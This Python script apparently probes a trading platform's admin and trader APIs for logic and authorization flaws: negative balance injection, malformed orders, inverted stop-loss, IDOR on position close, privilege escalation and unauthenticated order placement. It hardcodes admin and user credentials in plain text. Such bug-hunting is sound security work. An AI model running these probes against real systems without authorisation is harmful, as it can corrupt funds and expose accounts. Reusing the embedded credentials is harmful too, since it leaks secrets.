import requests
import json
import time

BASE_URL = "https://lpadmin.blackfx.com"
ADMIN_EMAIL = "lpadmin@blacktrader.com"
ADMIN_PASSWORD = "Raj1234!"
MASTER_EMAIL = "mamm@mailinator.com"
MASTER_PASSWORD = "12345678"
FOLLOWER_EMAIL = "mamf1@mailinator.com"
FOLLOWER_PASSWORD = "12345678"

# 1. Login Admin
adm_s = requests.Session()
r_adm = adm_s.post(f"{BASE_URL}/admin/api/login", json={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD, "remember": True}, timeout=10)
admin_token = r_adm.json().get("token")
admin_headers = {"Authorization": f"Bearer {admin_token}", "Content-Type": "application/json"}

# 2. Login Master & Follower
m_s = requests.Session()
r_m_login = m_s.post(f"{BASE_URL}/api/auth/login", json={"email": MASTER_EMAIL, "password": MASTER_PASSWORD}, timeout=10)
master_client_id = r_m_login.json().get("trader", {}).get("member_id") or "mem_11434b0b9d9d210899"
r_m_tok = m_s.post(f"{BASE_URL}/api/auth/chart-token", timeout=10)
master_token = r_m_tok.json().get("token")
master_headers = {"Authorization": f"Bearer {master_token}", "Content-Type": "application/json"}

f_s = requests.Session()
r_f_login = f_s.post(f"{BASE_URL}/api/auth/login", json={"email": FOLLOWER_EMAIL, "password": FOLLOWER_PASSWORD}, timeout=10)
follower_client_id = r_f_login.json().get("trader", {}).get("member_id") or "mem_0ea679062ffd38adf7"
r_f_tok = f_s.post(f"{BASE_URL}/api/auth/chart-token", timeout=10)
follower_token = r_f_tok.json().get("token")
follower_headers = {"Authorization": f"Bearer {follower_token}", "Content-Type": "application/json"}

confirmed_bugs = []

def run_probe(test_name, method, url, headers, json_data=None, params=None):
    print(f"\n==========================================")
    print(f"PROBE: {test_name}")
    print(f"REQUEST: {method} {url}")
    if json_data is not None:
        print(f"PAYLOAD: {json.dumps(json_data)}")
    
    try:
        r = requests.request(method, url, headers=headers, json=json_data, params=params, timeout=15)
        print(f"RESPONSE STATUS: {r.status_code}")
        print(f"RESPONSE BODY: {r.text[:600]}")
        return {
            "name": test_name,
            "method": method,
            "url": url,
            "payload": json_data,
            "status": r.status_code,
            "body": r.text
        }
    except Exception as e:
        print(f"ERROR: {e}")
        return {
            "name": test_name,
            "method": method,
            "url": url,
            "payload": json_data,
            "status": 0,
            "body": str(e)
        }

# --- TEST SET A: Admin API Balance & Money Logic Flaws ---

# Test A1: Negative balance injection on member via Admin API
res_a1 = run_probe(
    "Negative Balance Mutation via Admin API",
    "POST",
    f"{BASE_URL}/admin/api/members/{follower_client_id}/balance",
    headers=admin_headers,
    json_data={"instance": "real", "balance": -50000.0}
)
# Check if negative balance was actually set
r_check_funds = f_s.get(f"{BASE_URL}/v1/oms/real/funds", headers=follower_headers)
print("Follower funds after negative balance probe:", r_check_funds.status_code, r_check_funds.text)

# Reset follower balance back to 10000000
adm_s.post(f"{BASE_URL}/admin/api/members/{follower_client_id}/balance", headers=admin_headers, json={"instance": "real", "balance": 10000000.0})

# Test A2: NaN or Infinite balance injection via Admin API
res_a2 = run_probe(
    "String/Malformed Balance Injection via Admin API",
    "POST",
    f"{BASE_URL}/admin/api/members/{follower_client_id}/balance",
    headers=admin_headers,
    json_data={"instance": "real", "balance": "NOT_A_NUMBER"}
)

# Test A3: Invalid Book setting injection via Admin API
res_a3 = run_probe(
    "Invalid Book Mode ('z') Injection via Admin API",
    "POST",
    f"{BASE_URL}/admin/api/members/{follower_client_id}/book",
    headers=admin_headers,
    json_data={"book": "z"}
)

# Test A4: Negative credit grant via Admin API
res_a4 = run_probe(
    "Negative Credit Grant via Admin API",
    "POST",
    f"{BASE_URL}/admin/api/members/{follower_client_id}/credit",
    headers=admin_headers,
    json_data={"instance": "real", "amount": -10000.0, "reason": "Test Negative Credit"}
)

# --- TEST SET B: Trader API Orders & Basket Execution Bugs ---

# Test B1: Place basket order with empty legs or negative qty
res_b1 = run_probe(
    "Basket Order with Negative Leg Quantity",
    "POST",
    f"{BASE_URL}/v1/oms/real/orders/basket",
    headers=master_headers,
    json_data={
        "orders": [
            {"symbol": "BINANCE:BTCUSDT", "side": "BUY", "type": "MARKET", "qty": -0.5}
        ]
    }
)

# Test B2: Place basket order with zero legs
res_b2 = run_probe(
    "Basket Order with Zero Legs (500 crash check)",
    "POST",
    f"{BASE_URL}/v1/oms/real/orders/basket",
    headers=master_headers,
    json_data={"orders": []}
)

# Test B3: Place pending order with negative price
res_b3 = run_probe(
    "Pending Limit Order with Negative Price",
    "POST",
    f"{BASE_URL}/v1/oms/real/orders/pending",
    headers=master_headers,
    json_data={
        "symbol": "BINANCE:BTCUSDT",
        "side": "BUY",
        "type": "LIMIT",
        "price": -50000.0,
        "qty": 0.01
    }
)

# Test B4: Place pending order with price = 0
res_b4 = run_probe(
    "Pending Limit Order with Zero Price",
    "POST",
    f"{BASE_URL}/v1/oms/real/orders/pending",
    headers=master_headers,
    json_data={
        "symbol": "BINANCE:BTCUSDT",
        "side": "BUY",
        "type": "LIMIT",
        "price": 0.0,
        "qty": 0.01
    }
)

# --- TEST SET C: Position Protection & SL/TP Inversion Bugs ---

# Open a tiny test position first to test protection & reduce
r_order = m_s.post(f"{BASE_URL}/v1/oms/real/orders", headers=master_headers, json={
    "symbol": "BINANCE:BTCUSDT",
    "side": "BUY",
    "type": "MARKET",
    "qty": 0.01
})
print("Opened test position on master:", r_order.status_code, r_order.text)
mkt_ord_id = r_order.json().get("order", {}).get("market_order_id")

if mkt_ord_id:
    # Test C1: Set Take Profit LOWER than entry price on a BUY position (Inverted TP)
    res_c1 = run_probe(
        "Inverted Take-Profit on BUY Position (TP < Current Price)",
        "PUT",
        f"{BASE_URL}/v1/oms/real/positions/{mkt_ord_id}/protection",
        headers=master_headers,
        json_data={
            "tp_price": 100.0,  # BTC is > 80,000, setting TP to 100 on a BUY position!
            "sl_price": 0.0
        }
    )

    # Test C2: Set Stop Loss HIGHER than entry price on a BUY position (Inverted SL)
    res_c2 = run_probe(
        "Inverted Stop-Loss on BUY Position (SL > Current Price)",
        "PUT",
        f"{BASE_URL}/v1/oms/real/positions/{mkt_ord_id}/protection",
        headers=master_headers,
        json_data={
            "sl_price": 500000.0,  # BTC is < 100,000, setting SL to 500,000 on a BUY position!
            "tp_price": 0.0
        }
    )

    # Test C3: Negative Reduce Qty
    res_c3 = run_probe(
        "Partially Close Position with Negative Qty",
        "POST",
        f"{BASE_URL}/v1/oms/real/positions/{mkt_ord_id}/reduce",
        headers=master_headers,
        json_data={"qty": -0.005}
    )

    # Test C4: Reduce Qty GREATER than position qty (Over-reduction)
    res_c4 = run_probe(
        "Partially Close Position with Qty Greater than Position Size",
        "POST",
        f"{BASE_URL}/v1/oms/real/positions/{mkt_ord_id}/reduce",
        headers=master_headers,
        json_data={"qty": 100.0}
    )

    # Test C5: IDOR on Position Close (Follower tries to close Master's position)
    res_c5 = run_probe(
        "IDOR: Follower Attempts to Square Off Master Position",
        "POST",
        f"{BASE_URL}/v1/oms/real/positions/{mkt_ord_id}/squareoff",
        headers=follower_headers,
        json_data={}
    )

    # Clean up position
    r_close = m_s.post(f"{BASE_URL}/v1/oms/real/positions/{mkt_ord_id}/squareoff", headers=master_headers)
    print("Master position cleaned up:", r_close.status_code, r_close.text)

# --- TEST SET D: Authorization & Portal Flaws ---

# Test D1: Accessing admin endpoint with Trader token
res_d1 = run_probe(
    "Privilege Escalation: Trader Calls Admin Member List with Chart Token",
    "GET",
    f"{BASE_URL}/admin/api/members",
    headers=master_headers
)

# Test D2: Unauthenticated order placement
res_d2 = run_probe(
    "Unauthenticated Order Placement",
    "POST",
    f"{BASE_URL}/v1/oms/real/orders",
    headers={"Content-Type": "application/json"},
    json_data={"symbol": "BINANCE:BTCUSDT", "side": "BUY", "type": "MARKET", "qty": 0.01}
)

# Test D3: Portal Deposit with negative or 0 amount
res_d3 = run_probe(
    "Portal Deposit Request with Negative Amount",
    "POST",
    f"{BASE_URL}/v1/oms/real/portal/deposits",
    headers=follower_headers,
    json_data={"amount": -5000.0, "currency": "USD", "method": "crypto"}
)

# Test D4: Move money between accounts with negative amount
res_d4 = run_probe(
    "Internal Transfer Request with Negative Amount",
    "POST",
    f"{BASE_URL}/v1/oms/real/portal/transfers",
    headers=follower_headers,
    json_data={"from_account": "real", "to_account": "paper", "amount": -1000.0}
)

# Test D5: Practice balance reset on REAL instance (Practice balance is paper only)
res_d5 = run_probe(
    "Reset Practice Balance on REAL Instance",
    "POST",
    f"{BASE_URL}/v1/oms/real/funds/practice",
    headers=follower_headers,
    json_data={"balance": 9999999.0}
)

print("\n[+] All hunt probes completed.")
